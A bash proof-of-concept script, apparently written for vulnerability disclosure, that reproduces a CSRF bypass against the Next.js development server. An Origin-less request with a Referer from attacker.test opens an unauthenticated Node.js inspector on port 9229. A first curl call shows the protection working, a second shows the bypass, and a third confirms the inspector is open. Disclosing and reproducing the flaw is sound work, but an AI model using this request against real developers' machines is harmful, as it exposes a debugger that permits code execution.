#!/usr/bin/env bash
# PoC: Next.js dev-server CSRF bypass -> unauthenticated Node.js inspector activation
#
# Requires: a running `next dev` server (this repro used port 3020), plus /etc/hosts
# entries mapping two DIFFERENT hostnames to 127.0.0.1 so the browser genuinely
# treats them as cross-site (testing against 127.0.0.1 on two ports alone is NOT
# enough - Chrome treats same-IP different-port as "same-site").
#
#   echo "127.0.0.1 attacker.test"   >> /etc/hosts
#   echo "127.0.0.1 victimdev.test" >> /etc/hosts
#
set -e
DEV_PORT="${1:-3020}"

echo "[1] Control: legitimate cross-origin fetch() WITH Origin header -> must be blocked"
curl -s -D- --noproxy '*' "http://victimdev.test:${DEV_PORT}/__nextjs_attach-nodejs-inspector" \
  -H 'Origin: http://attacker.test' -o /tmp/ctrl.out | head -1
cat /tmp/ctrl.out
echo

echo "[2] The bypass: same request shape a real cross-site <iframe> navigation produces"
echo "    (no Origin header at all - confirmed against real headless Chromium, see"
echo "    captured_requests.txt)"
curl -s -D- --noproxy '*' "http://victimdev.test:${DEV_PORT}/__nextjs_attach-nodejs-inspector" \
  -H 'Referer: http://attacker.test/attack.html' -o /tmp/bypass.out | head -1
cat /tmp/bypass.out
echo
echo "[3] The Node.js inspector is now open as a direct side-effect of [2]:"
curl -s --noproxy '*' http://127.0.0.1:9229/json/list
